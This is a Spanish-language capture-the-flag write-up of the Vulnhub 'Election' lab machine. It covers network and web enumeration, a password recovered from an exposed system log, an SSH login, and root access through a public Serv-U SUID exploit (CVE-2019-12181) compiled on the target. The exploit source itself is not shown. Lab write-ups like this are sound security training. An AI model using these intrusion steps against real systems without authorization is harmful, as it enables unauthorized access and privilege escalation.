---
title: Vulnhub Election Writeup
published: true
---

La máquina Election es una máquina de Vulnhub en la que mediante la explotación de la misma conseguiremos la flag del usuario y la de root.

Cabe mencionar que puesto que es una máquina de Vulnhub, se corre en local y deberemos establecer conexión con ella en nuestra red para localizar su dirección IP. Para ello, tras establecer el adaptador de red de l máquina víctima a Bridge en VirtualBox (en mi caso) y encenderla, podremos localizar la Ip correspondiente mediante un escaneo de nuestra red local con arp-scan:

```bash
❯ sudo arp-scan -I eth0 --localnet --ignoredups
[sudo] contraseña para jorge: 
Interface: eth0, type: EN10MB, MAC: 08:00:27:22:46:4f,
Starting arp-scan 1.9.7 with 16 hosts (https://github.com/royhills/arp-scan)
172.20.10.1     26:5e:48:39:02:64       (Unknown: locally administered)
172.20.10.6     54:af:97:72:cd:87       (Unknown)
172.20.10.13    08:00:27:ed:72:86       PCS Systemtechnik GmbH

3 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 16 hosts scanned in 1.483 seconds (10.79 hosts/sec). 3 responded
```
Con este comando escaneamos nuestra red local de la interfaz eth0 y conseguimos la IP-VICTIMA: 172.20.10.13

# [](#header-1)Enumeración

La enumeración se trata de una de las fases principales, en las que recolectamos la máxima información posible de la máquina víctima.

Usaremos nmap para analizar los puertos abiertos:

```bash
nmap -p- --open --min-rate 5000 -vvv -n $IP-VICTIMA -oG allPorts
```

*  Escaneo todos los puertos abiertos: -p- --open

*  Mediante --min-rate 5000 indicamos que queremos emitir paquetes no más lentos que 5000 paquetes por segundo.

*  Triple verbose (-vvv) para que vaya reportando por consola los puertos abiertos y no tener que esperar al final del escaneo.

*  Para que el escaneo no aplique resolución DNS usamos -n

*  En mi caso exporto los puertos abiertos en formato grepeable (-oG) al archivo allPorts

```bash
❯ nmap -p- --open --min-rate 5000 -T5 -Pn -vvv -n 172.20.10.13
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 06:36 EDT
Initiating Connect Scan at 06:36
Scanning 172.20.10.13 [65535 ports]
Discovered open port 22/tcp on 172.20.10.13
Discovered open port 80/tcp on 172.20.10.13
Completed Connect Scan at 06:36, 2.25s elapsed (65535 total ports)
Nmap scan report for 172.20.10.13
Host is up, received user-set (0.00026s latency).
Scanned at 2023-03-28 06:36:29 EDT for 3s
Not shown: 65533 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 2.28 seconds
```

El escaneo nos reporta dos puertos abiertos, el 22 y el 80, así como el servicio que corre en cada uno de ellos.

Ananalizamos la versión y servicio de estos puertos mediante nmap para sacar más información:

```bash
❯ nmap -p22,80 -sCV 172.20.10.13
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-28 06:37 EDT
Nmap scan report for 172.20.10.13
Host is up (0.00042s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 20d1ed84cc68a5a786f0dab8923fd967 (RSA)
|   256 7889b3a2751276922af98d27c108a7b9 (ECDSA)
|_  256 b8f4d661cf1690c5071899b07c70fdc0 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.51 seconds
```

Nada relevante por aquí, yso el comando whatweb para ver de que se trata pero no nos reporta nada importante, simplemente un servicio de Apache normal:

```bash
❯ whatweb 172.20.10.13
http://172.20.10.13 [200 OK] Apache[2.4.29], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.29 (Ubuntu)], IP[172.20.10.13], Title[Apache2 Ubuntu Default Page: It works]
```

Buscaremos directorios ocultos con gobuster:

```bash
❯ gobuster dir -u http://172.20.10.13 -w /usr/share/wordlists/dirb/common.txt -t 25
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.20.10.13
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/28 06:40:13 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 10918]
/javascript           (Status: 301) [Size: 317] [--> http://172.20.10.13/javascript/]
/phpmyadmin           (Status: 301) [Size: 317] [--> http://172.20.10.13/phpmyadmin/]
/phpinfo.php          (Status: 200) [Size: 95398]
/robots.txt           (Status: 200) [Size: 30]
/server-status        (Status: 403) [Size: 277]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/03/28 06:40:18 Finished
===============================================================
```

Encontramos tres directorios importantes. En phpinfo.php únicamente hay información del sitio. En phpmyadmin tenemos un panel de login y en robots.txt nos reporta cuatro directorios. De estos cuatro únicamente /election nos muestra una web. No parece que sea interactivo. Buscamos directorios ocultos a partir de esta dirección con gobuster:

```bash
❯ gobuster dir -u http://172.20.10.13/election -w /usr/share/wordlists/dirb/common.txt -t 25
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.20.10.13/election
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/28 06:46:52 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/admin                (Status: 301) [Size: 321] [--> http://172.20.10.13/election/admin/]
/data                 (Status: 301) [Size: 320] [--> http://172.20.10.13/election/data/]
/index.php            (Status: 200) [Size: 7003]
/js                   (Status: 301) [Size: 318] [--> http://172.20.10.13/election/js/]
/languages            (Status: 301) [Size: 325] [--> http://172.20.10.13/election/languages/]                                                                                         
/lib                  (Status: 301) [Size: 319] [--> http://172.20.10.13/election/lib/]
/media                (Status: 301) [Size: 321] [--> http://172.20.10.13/election/media/]
/themes               (Status: 301) [Size: 322] [--> http://172.20.10.13/election/themes/]
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/03/28 06:46:56 Finished
===============================================================
```

El más interesante es /admin en el que nos pide un ID. Segiremos rastreando con gobuster:

```bash
❯ gobuster dir -u http://172.20.10.13/election/admin -w /usr/share/wordlists/dirb/common.txt -t 25
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.20.10.13/election/admin
[+] Method:                  GET
[+] Threads:                 25
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/03/28 06:48:14 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/ajax                 (Status: 301) [Size: 326] [--> http://172.20.10.13/election/admin/ajax/]                                                                                        
/components           (Status: 301) [Size: 332] [--> http://172.20.10.13/election/admin/components/]                                                                                  
/css                  (Status: 301) [Size: 325] [--> http://172.20.10.13/election/admin/css/]                                                                                         
/.htaccess            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/img                  (Status: 301) [Size: 325] [--> http://172.20.10.13/election/admin/img/]                                                                                         
/inc                  (Status: 301) [Size: 325] [--> http://172.20.10.13/election/admin/inc/]                                                                                         
/index.php            (Status: 200) [Size: 8964]
/js                   (Status: 301) [Size: 324] [--> http://172.20.10.13/election/admin/js/]                                                                                          
/logs                 (Status: 301) [Size: 326] [--> http://172.20.10.13/election/admin/logs/]                                                                                        
/plugins              (Status: 301) [Size: 329] [--> http://172.20.10.13/election/admin/plugins/]                                                                                     
Progress: 4614 / 4615 (99.98%)
===============================================================
2023/03/28 06:48:18 Finished
===============================================================

```

Nos reporta un /logs que puede ser interesante. Parece que podemos bajarnos system.log

# []($header-1)Acceso al sistema

Nos lo descargamos, vemos qué tipo de archivo es y puetso que es un ASCII text lo abrimos:

```bash
❯ mv /home/jorge/Descargas/system.log .
❯ ls
 system.log
❯ file system.log
system.log: ASCII text
❯ cat system.log
───────┬───────────────────────────────────────────────────────────────────────────────────
       │ File: system.log
───────┼───────────────────────────────────────────────────────────────────────────────────
   1   │ [2020-01-01 00:00:00] Assigned Password for the user love: ??????????
   2   │ [2020-04-03 00:13:53] Love added candidate 'Love'.
   3   │ [2020-04-08 19:26:34] Love has been logged in from Unknown IP on Firefox (Linux).
───────┴───────────────────────────────────────────────────────────────────────────────────
```

Nos reporta la contraseña para el usuario love. Intentaremos conectarnos medianre ssh ya que el puerto 22 está abierto:

```bash
❯ ssh love@172.20.10.13
love@172.20.10.13's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

74 packages can be updated.
28 updates are security updates.

New release '20.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Tue Mar 28 03:24:14 2023 from 172.20.10.14
love@election:~$ whoami
love
❯ ssh love@172.20.10.13
love@172.20.10.13's password: 
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 5.3.0-46-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
   just raised the bar for easy, resilient and secure K8s cluster deployment.

   https://ubuntu.com/engage/secure-kubernetes-at-the-edge

 * Canonical Livepatch is available for installation.
   - Reduce system reboots and improve kernel security. Activate at:
     https://ubuntu.com/livepatch

74 packages can be updated.
28 updates are security updates.

New release '20.04.6 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Your Hardware Enablement Stack (HWE) is supported until April 2023.
Last login: Tue Mar 28 03:24:14 2023 from 172.20.10.14
love@election:~$ whoami
love
```

Estamos dentro del sistema. En Desktop encontramos la flag del usuario:

```bash
love@election:~$ cd Desktop
love@election:~/Desktop$ ls
user.txt
love@election:~/Desktop$ cat user.txt
cd38ac698c0d793??????????????????
```

# []($header-1)Escalada de privilegios

No nos deja hacer sudo -l y la versión de sudo no es vulnerable por lo que buscamos permisos SUID con find:

```bash
love@election:~/Desktop$ find / -perm -4000 2>/dev/null
/usr/bin/arping
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/sbin/pppd
/usr/local/Serv-U/Serv-U
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/xorg/Xorg.wrap
/bin/fusermount
/bin/ping
/bin/umount
/bin/mount
/bin/su
/home/love
```

Observamos que aparece Serv-U, el cuál no suele aparecer en este tipo de búsquedas. BUscamos exploits por esta vía en nuestro navegador y nos reporta CVE-2019-12181.

Buscamos el exploit en <a href="https://github.com/mavlevin/CVE-2019-12181">Github</a> y creamos un archivo en /tmp con el eploit para compilarlo. Puesto que tiene gcc lo podemos compilar con:

> gcc exploit.c -o exploit

Lo ejecutamos y somos root.

```bash
love@election:/tmp$ gcc exploit.c -o exploit
love@election:/tmp$ ./exploit 
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),116(lpadmin),126(sambashare),1000(love)
opening root shell
# whoami
root
```

```bash
# cd /root
# ls
root.txt
# cat root.txt
5238feef?????????????
```

Muchas gracias por leer este Writeup. Espero que te haya gustado mucho!
